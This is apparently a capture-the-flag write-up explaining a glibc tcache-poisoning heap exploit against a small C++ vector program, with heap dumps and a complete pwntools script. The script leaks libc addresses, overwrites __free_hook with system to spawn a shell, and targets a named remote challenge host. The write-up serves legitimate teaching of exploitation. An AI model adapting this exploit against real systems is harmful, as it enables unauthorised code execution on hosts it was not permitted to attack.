# CevPwn Exploit

## Introduction

The solution to this challenge uses a heap exploit. Therefore it is advised to first read up on glibc heaps: \
<https://azeria-labs.com/heap-exploitation-part-1-understanding-the-glibc-heap-implementation/> \
<https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/>

We first inspect the given code:

```c++
#include <iostream>
#include <vector>
#include <assert.h>
using namespace std;
#define ll long long

const int mxn = 1000;

void answer(){
    int n, q;
    cin >> n >> q;
    assert(n >= 1 && n <= mxn);

    vector<ll> v;
    for(ll i = 0, x; i < n; i++) cin >> x, v.push_back(x);

    for(int i = 0; i < q; i++){
        int t;
        cin >> t;
        if(t & 1){
            ll x, y;
            cin >> x >> y;
            assert(x >= 0 && x <= n);
            v[--x] = y;
        }else{
            int x;
            cin >> x;
            x--;
            assert(x >= 0 && x <= n);
            cout << v[x] << endl;
        }
    }
}

int main(){
    int t;
    cin >> t;
    for(int i = 0; i < t; i++)    answer();
    return 0;
}

 ```

We notice three important things:

- The vector `v` is created iteratively. Therefore if we ever create a vector we will allocate multiple chunks of increasing size.
- The program allows us to read at `v[n]`
- The program allows us to write to `v[-1]`

## tcachebins

In this exploit we mostly work with tcachebins. Therefore we want to line out a few important characteristics. Tcachebins are used to quickly recycle small chunks. There are 7 tcachebins (of sizes `0x20`,`0x30`,`0x50`,`0x90`,`0x110`,`0x210` and `0x410`) each holding up to 7 elements (i.e. chunks). The elements (chunks) in a bin are connected as a single-linked list. I.e. if a chunk of fitting size is freed it will be put at the beginning of the list of the corresponding tcachebin.

If an array of a given size is created, the first chunk of the corresponding tcachebin will be allocated. The good thing for us is that there is not a lot of validation for tcachebins. As long as the size of one of our chunks corresponds to one of the tcachebins and there is still space for another element it will land there.

One important thing to keep in mind is that tcachebins keep track of their length. This is important for corruption later as it could lead to segfaults. If a chunk is put in a tcachebin, the pointer to the next element will simply be written to the first element of the chunk. (In our case to `&v[0]`).
Keep that in mind for later.

## Heap exploit idea

Looking at the code, we want to find ways to exploit the underflow write and overflow read issues.

Looking at the documentation from before, we know that `v[-1]` contains some metadata for the chunk, most notably the chunk size. Overwriting the chunk size enables us to enlargen the chunk and then write/read bytes of the following chunk(s) and also change the tcachebin for a chunk.

The idea is now to create several consecutive chunks on the heap. We then take one from the middle and enlargen it so that we can overwrite the tcachebin pointer of one of the following chunks with any adress we like. Then our address is in the linked list of one of the tcachebins. With that we can later allocate a chunk of a given size at an address of our choice. Using the same technique we can also first read the existing pointer using the overflow read.

## Example

Say we allocate 4 chunks `a` (at `0x55555556ce90`) with size `0x20`, `b` (at `0x55555556cec0`) with size `0x20`, `c` (at `0x55555556cef0`) with size `0x30` and `d` (at `0x55555556cf20`) with size `0x30`. (While `a` is not strictly relevant to this example, it's existence is important as it serves as a buffer at the end of the `0x20` tcachebin. We will see why later.) In the given program we can create those chunks by creating a vector of size `0x50` and then corrupting its size to be `0x30`. The chunks would all be written consequtively on the heap. After freeing them, the heap (starting at `b`) would look something like this:

```text
0x55555556ceb0: 0x0000000000000000 0x0000000000000021
0x55555556cec0: 0x000055555556ce90 0x000055555555a010
0x55555556ced0: 0x0000000000000bbb 0x0000000000000000
0x55555556cee0: 0x0000000000000000 0x0000000000000031
0x55555556cef0: 0x0000000000000000 0x000055555555a010
0x55555556cf00: 0x0000000000000ccc 0x0000000000000ccc
0x55555556cf10: 0x0000000000000000 0x0000000000000031
0x55555556cf20: 0x000055555556cef0 0x000055555555a010
0x55555556cf30: 0x0000000000000ddd 0x0000000000000ddd
```

tcachebins:

```text
(0x20) -> 0x55555556ceb0 -> 0x55555556ce90 (2)
(0x30) -> 0x55555556cf20 -> 0x55555556cef0 (2)
```

Note that `d` points to `c`. By overwriting the size of `b` we can now enlargen it to size `0x90`. This causes `b` to land in the corresponding `0x90` tcachebin.

tcachebins:

```text
(0x20) -> 0x55555556ce90 (2)
(0x30) -> 0x55555556cf20 -> 0x000055555556cef0  (2)
(0x90) -> 0x55555556ceb0 (1)
```

Note that the saved length of the `0x20` bin (i.e. 2) does not correspond to the actual length (i.e. 1). That is not an issue as long as we do not empty the bin. This is why we need the chunk `a`. If `a` did not exist, the next time we would try to create a vector the program would try to allocate the (non-existent) chunk in `0x20`. In that case it would try to allocate space at the address
the previous chunk was pointing at, which is `NULL` per default, resulting in a segfault.

If we now create a vector that would use a chunk from the `0x90` bin (e.g. 12 or 13 elements) we will be assigned the address of `b` since the chunk already exists. (Note: in case of our program, smaller chunks would also be newly created in the process since we build the vectors iteratively. That, however, is no issue as long as the smaller bins are not corrupted. Again, the existence of `a` is crucial here.) Therefore creating the array `[0xaaa]*11+[0x31]` would change the heap like this:

```text
0x55555556ceb0: 0x0000000000000000 0x0000000000000091
0x55555556cec0: 0x0000000000000aaa 0x0000000000000aaa
0x55555556ced0: 0x0000000000000aaa 0x0000000000000aaa
0x55555556cee0: 0x0000000000000aaa 0x0000000000000aaa
0x55555556cef0: 0x0000000000000aaa 0x0000000000000aaa
0x55555556cf00: 0x0000000000000aaa 0x0000000000000aaa
0x55555556cf10: 0x0000000000000aaa 0x0000000000000031
0x55555556cf20: 0x000055555556cef0 0x000055555555a010
0x55555556cf30: 0x000000000000cccc 0x000000000000cccc

```

Using our overflow read we can now read at `0x55555556cf20`, which gives us the address `0x55555556cef0`, which in turn points to chunk `c` (which was overwritten in the process). Now we can create the array `[0xaaa]*11 +[0x31]+[&maliciousptr]` to overwrite the pointer from `d` to `c` to instead point to `&maliciousptr`.

```text
0x55555556ceb0: 0x0000000000000000 0x0000000000000091
0x55555556cec0: 0x0000000000000aaa 0x0000000000000aaa
0x55555556ced0: 0x0000000000000aaa 0x0000000000000aaa
0x55555556cee0: 0x0000000000000aaa 0x0000000000000aaa
0x55555556cef0: 0x0000000000000aaa 0x0000000000000aaa
0x55555556cf00: 0x0000000000000aaa 0x0000000000000aaa
0x55555556cf10: 0x0000000000000aaa 0x0000000000000031
0x55555556cf20: &maliciousptr      0x000055555555a010
0x55555556cf30: 0x000000000000cccc 0x000000000000cccc
```

tcachebins:

```text
(0x20) -> 0x55555556ce90 (2)
(0x30) -> 0x55555556cf20 -> &maliciousptr (2)
(0x90) -> 0x55555556ceb0 (1)
```

Now we have to remove `d` from the tachebins. We simply corrupt its size to have it freed into any other bin (such as `0x90`).

tcachebins:

```text
(0x20) -> 0x55555556ce90 (2)
(0x30) -> &maliciousptr (1)
(0x90) -> 0x55555556cf20 -> 0x55555556ceb0 (2)
```

The next time we create an array of size `0x30` we will be allocated space at `&maliciousptr`, thereby giving us arbitrary read and write.

## Spawning a shell

Assuming that we know all relevant libc adresses, how could we use the exploit above to spawn a shell?
For that we first use `&__free_hook-0x10` as `&maliciousptr` and then overwrite it such that it points to `system`. Continuing with the example from before, the tcachebins would then look like this:

tcachebins:

```text
(0x20) -> 0x55555556ce90 (2)
(0x30) -> &__free_hook-0x10 (1)
(0x90) -> 0x55555556cf20 -> 0x55555556ceb0 (2)
```

Now we can spawn a shell by simply creating the vector `["/bin/sh", 0x0, system]`.

This works, because we iteratively create vectors in the program. First the smallest bin `a` at `0x55555556ce90` will be allocated and the first two elements `["/bin/sh", 0x0]` will be written to it. In the third iteration of creating the vector realloc is called and we write `["/bin/sh", 0x0, system]` to `&__free_hook-0x10`. Afterwards the program wants to free the memory at `0x55555556ce90` again. Since we overwrote the `__free_hook` with `system` at this point, we instead call `system` with `"/bin/sh"` as parameter therefore spawning a shell.

## Beating ASLR

Unfortunately, life is not that easy and we first have to find at least one libc address as ASLR makes it basically impossible to guess them. Having any libc address then allows us to determine the other ones (i.e. `&__free_hook`, `system`) by calculating the offset for a given libc. Fortunately for us, chunks that land in the unsorted bin will contain the libc address `&main_arena+96`. Therefore, we simply need to create a vector/chunk large enough to not land in the tcachebins. Any such vector would at least temporarily be stored in the unsorted bin and therefore contain that address.

The idea now is pretty simple. We first use that knowledge to create such a chunk, effectively writing `&main_arena+96` somewhere on our heap. We then use the exploit from before to first read any address on the heap (i.e. a pointer from the tcachebin list) and then overwrite that adress such that we can allocate memory
right before the large chunk, allowing us to read the address `&main_arena+96`. Since all our elements on the heap are written consequtively, the offset between the address read and the address of the chunk containting `&main_arena+96` is constant, regardless of ASLR.

With `&main_arena+96` we can then determine `&__free_hook` and `system` and therefore execute the exploit as described before.

Note: `main_arena` is usually not exported in a libc without debug symbols, but we can still determine its location using techiques described e.g. here: <https://github.com/bash-c/main_arena_offset>

## Putting it all together

We put all of the above together in the following python script:

```python
#!/usr/bin/env python3

from pwn import *

def StrToQWord(s):
    out = 0
    i = 0
    for char in s:
        out |= (ord(char) << (8*i))
        i+= 1
    return out

def SizePInUse(size):
    return (size << 3) | 1

def DropShell(conn, system):
    payload = [StrToQWord("/bin/sh")] * 4 + [system]
    n = len(payload)
    q = 0
    conn.sendline(bytes(str(n), 'ascii'))
    conn.sendline(bytes(str(q), 'ascii'))
    for i in range(n):
        conn.sendline(bytes(str(payload[i]), 'ascii'))

def AllocVector(conn, contents, corruptSize=-1):
    n = len(contents)
    q = 1
    if corruptSize != -1:
        q += 1
    conn.sendline(bytes(str(n), 'ascii'))
    conn.sendline(bytes(str(q), 'ascii'))
    for i in range(n):
        conn.sendline(bytes(str(contents[i]), 'ascii'))
    conn.sendline(b"0")
    conn.sendline(bytes(str(len(contents)+1), 'ascii'))
    rval = int(conn.recvline())
    if corruptSize != -1:
        conn.sendline(b"1")
        conn.sendline(b"0")
        conn.sendline(bytes(str(corruptSize), 'ascii'))
    return rval


mode = "local" # or remote

if mode == "local":
    r = process('./cev')
elif mode == "remote":
    r = remote('santapwn.owasp.si', 7478)

### some large `t`, in the end we will control RIP anyways

r.sendline(b"2000000")

### fill tcache so that every bin has at least 2 elements
AllocVector(r, [0xDEADBEEF]*3, SizePInUse(4))
AllocVector(r, [0xDEADBEEF]*5, SizePInUse(6))
AllocVector(r, [0xDEADBEEF]*9, SizePInUse(10))
AllocVector(r, [0xDEADBEEF]*17, SizePInUse(18))
AllocVector(r, [0xDEADBEEF]*33, SizePInUse(34))
AllocVector(r, [0xDEADBEEF]*65, SizePInUse(66))
AllocVector(r, [0xDEADBEEF]*129, SizePInUse(130))

### add an additional large chunks. This will be placed in an unsorted bin and threrefore contain a pointer
### to main_arena+96

AllocVector(r, [0xF00DBABE]*260)

### select chunk from 0x90 tcachebin and enlargen it (to size 0x410)
### Given our setup this chunk is in the heap right before
### both 0x110 chunks. Therefore the larger size allows us to manipulate those.

AllocVector(r, [0xDEADC0DE]*9, SizePInUse(130))

### First we read the pointer from one chunk in the 0x110 tcachebin

heapLeak = AllocVector(r, [0xA] * 67 + [0x111])
log.info("Heap Leak: " + hex(heapLeak))

### Offset between the address read and the address of the 
### chunk containting &main_arena+96
### This can be calculated as the size of the chunks created between them i.e. 8*(34+2*66+2*130+258)

heapoffset = 8 * 684 

### Write the address to the chunk inside the  0x110 tcachebin.

AllocVector(r, [0x0] * 67 + [0x111] + [heapLeak + heapoffset - 16*8], SizePInUse(18))

### Clear first vector in 0x110 bin

AllocVector(r, [SizePInUse(130)] * 17, SizePInUse(130))

### Read &main_arena+96

arenaLeak = AllocVector(r, [SizePInUse(130)] * 15 + [0x9541] + [0x0], SizePInUse(34))

log.info("main_arena+96: " + hex(arenaLeak))

### Do the same thing again this time with chunks from 0x30 bin overflowing into chunks from 0x50 bin

AllocVector(r, [0xDEAD] * 3, SizePInUse(34))

### Address of __freehook for the exploit

AllocVector(r, [0xF00D] * 19 + [0x51] + [arenaLeak + 0x3290-8*4], SizePInUse(6))
AllocVector(r, [0xC0DE] * 5, SizePInUse(130))

### Leak the flag and spawn a shell using the leaked system address and our __freehook exploit

DropShell(r, arenaLeak - 0x175D90)
r.sendline(b"cat flag.txt")
flag = r.recvline(timeout=1).decode("ascii").strip()
log.info("Your flag is \"" + flag + "\" - Spawning shell, have fun!")
r.interactive()
```

## Pitfalls

The server runs our program through `soccat` as we can confirm by using our newly spawned shell (Or guess, since it is a common way to setup binary exploitation challenges). This is not really a problem, however it causes the heap to behave slightly different which is why at first our exploit worked locally but not on the remote machine. We tidied the exploit as best as we could and reorganized some of the tcache poison attacks to make it work both on our local machines as well as remote.
